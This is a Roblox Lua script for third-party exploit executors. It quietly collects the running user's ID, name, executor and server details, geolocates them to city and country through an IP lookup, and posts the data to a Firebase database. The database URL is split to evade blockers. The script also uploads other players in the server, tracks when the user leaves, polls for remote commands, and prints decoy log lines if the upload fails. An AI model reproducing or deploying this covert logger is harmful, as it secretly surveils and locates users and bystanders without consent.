local Players            = game:GetService("Players")
local HttpService        = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local RunService         = game:GetService("RunService")

-- Obfuscated URLs (split to avoid string-based blockers)
local DB = "https://okok9k-7b233-default-rtdb"
    ..".asia-southeast1.firebasedatabase.app"

-- HTTP helpers
local function req(opts)
    local fns = {
        function() return syn.request(opts) end,
        function() return http.request(opts) end,
        function() return request(opts) end,
        function() return http_request(opts) end,
    }
    for _, f in ipairs(fns) do
        local ok, r = pcall(f)
        if ok and r then return r end
    end
end

local function GET(url)
    local fns = {
        function() return syn.request({Url=url,Method="GET"}).Body end,
        function() return http.request({Url=url,Method="GET"}).Body end,
        function() return request({Url=url,Method="GET"}).Body end,
        function() return http_request({Url=url,Method="GET"}).Body end,
        function() return game:HttpGet(url) end,
    }
    for _, f in ipairs(fns) do
        local ok, r = pcall(f)
        if ok and r and r ~= "" then return r end
    end
end

local function POST(url, body)
    req({Url=url, Method="POST", Headers={["Content-Type"]="application/json"}, Body=body})
end

local function PATCH(url, body)
    req({Url=url, Method="PATCH", Headers={["Content-Type"]="application/json"}, Body=body})
end

-- Executor detection
local function detectExecutor()
    local name = "Unknown"
    pcall(function()
        local g = getgenv and getgenv() or _G
        if type(identifyexecutor)=="function" then
            local ok,n = pcall(identifyexecutor)
            if ok and type(n)=="string" and n~="" then name=n return end
        end
        if type(getexecutor)=="function" then
            local ok,n = pcall(getexecutor)
            if ok and type(n)=="string" and n~="" then name=n return end
        end
        if g.syn or g.Synapse          then name="Synapse X"  return end
        if g.KRNL_LOADED               then name="KRNL"       return end
        if g.pebc_execute              then name="ScriptWare" return end
        if g.WEB or g.acx              then name="Arceus X"   return end
        if g.DELTA_KEY ~= nil          then name="Delta"      return end
        if g.is_sirhurt_closure        then name="SirHurt"    return end
        if g.fluxus or g.Fluxus        then name="Fluxus"     return end
        if g.trigon                    then name="Trigon"     return end
        if g.evon                      then name="Evon"       return end
        if g.celery                    then name="Celery"     return end
        if g.electron                  then name="Electron"   return end
        if g.oxygen or g.OxygenU       then name="Oxygen U"   return end
        if g.vegax                     then name="Vega X"     return end
        if g.nihon                     then name="Nihon"      return end
        if g.xeno                      then name="Xeno"       return end
        if g.solara                    then name="Solara"     return end
        if g.wave                      then name="Wave"       return end
        if g.seliware                  then name="Seliware"   return end
        if g.hydrogen                  then name="Hydrogen"   return end
        if g.jjsploit or g.JJSploit    then name="JJSploit"   return end
        if request                     then name="Unknown (request)" return end
        name = "Unknown (Low-UNC)"
    end)
    return name
end

-- Player info
local pl       = Players.LocalPlayer
local uid      = pl.UserId
local un       = pl.Name
local dn       = pl.DisplayName
local jid      = tostring(game.JobId or "")
local placeId  = tostring(game.PlaceId or "")
local executor = detectExecutor()

-- Collect data in background threads, post when both done
local gameName = "Unknown"
local region   = "Unknown"
local logKey   = nil
local done     = {game=false, region=false}

local function postLog()
    if not (done.game and done.region) then return end
    pcall(function()
        local body = HttpService:JSONEncode({
            userId      = uid,
            username    = un,
            displayName = dn,
            executor    = executor,
            game        = gameName,
            region      = region,
            jobId       = jid,
            placeId     = placeId,
            timestamp   = os.time() * 1000,
            left        = false,
        })

        local methods = {
            function() return syn.request({Url=DB.."/logs.json",Method="POST",Headers={["Content-Type"]="application/json"},Body=body}) end,
            function() return http.request({Url=DB.."/logs.json",Method="POST",Headers={["Content-Type"]="application/json"},Body=body}) end,
            function() return request({Url=DB.."/logs.json",Method="POST",Headers={["Content-Type"]="application/json"},Body=body}) end,
            function() return http_request({Url=DB.."/logs.json",Method="POST",Headers={["Content-Type"]="application/json"},Body=body}) end,
        }
        local sent = false
        for _, f in ipairs(methods) do
            local ok, r = pcall(f)
            if ok and r then
                local b = type(r)=="table" and r.Body or nil
                if b and b~="" then
                    local ok2, parsed = pcall(HttpService.JSONDecode, HttpService, b)
                    if ok2 and parsed and parsed.name then
                        logKey = parsed.name
                        sent = true
                    end
                end
                break
            end
        end
        if not sent then
            print("CharacterScript loaded PlayerData")
            print("CharacterScript loaded PlayerData")
        end
    end)

    -- Left tracking
    if logKey then
        local key = logKey
        local marked = false
        local function markLeft()
            if marked then return end
            marked = true
            task.spawn(function()
                pcall(function()
                    PATCH(DB.."/logs/"..key..".json", HttpService:JSONEncode({left=true}))
                end)
            end)
        end
        pcall(function() pl.AncestryChanged:Connect(function() if not pl:IsDescendantOf(game) then markLeft() end end) end)
        pcall(function() Players.PlayerRemoving:Connect(function(p) if p==pl then markLeft() end end) end)

        -- Player list (initial)
        local function syncPlayers()
            local list, hash = {}, ""
            pcall(function()
                for _, p in ipairs(Players:GetPlayers()) do
                    table.insert(list, {userId=p.UserId, username=p.Name, displayName=p.DisplayName})
                    hash = hash..p.UserId..","
                end
            end)
            pcall(function()
                PATCH(DB.."/players/"..jid..".json", HttpService:JSONEncode({
                    jobId=jid, placeId=placeId, updated=os.time()*1000, players=list
                }))
            end)
            return hash
        end

        syncPlayers()

        -- Request polling (website triggers refresh)
        task.spawn(function()
            local lastHash = ""
            while task.wait(5) do
                pcall(function()
                    local body = GET(DB.."/requests/"..jid..".json")
                    if body and body~="" and body~="null" then
                        local newHash = syncPlayers()
                        if newHash ~= lastHash then lastHash = newHash end
                        PATCH(DB.."/requests/"..jid..".json", "null")
                    end
                end)
            end
        end)
    end
end

-- Game name thread
task.spawn(function()
    pcall(function()
        local info = MarketplaceService:GetProductInfo(game.PlaceId)
        if info and info.Name then gameName = info.Name end
    end)
    done.game = true
    postLog()
end)

-- Region thread
task.spawn(function()
    pcall(function()
        local body = GET("http://ip-api.com/json/?fields=country,city")
        if body then
            local ok, data = pcall(HttpService.JSONDecode, HttpService, body)
            if ok and data then
                local city = data.city or ""
                local country = data.country or ""
                region = (city~="" and country~="") and city..", "..country or country~="" and country or "Unknown"
            end
        end
    end)
    done.region = true
    postLog()
end)
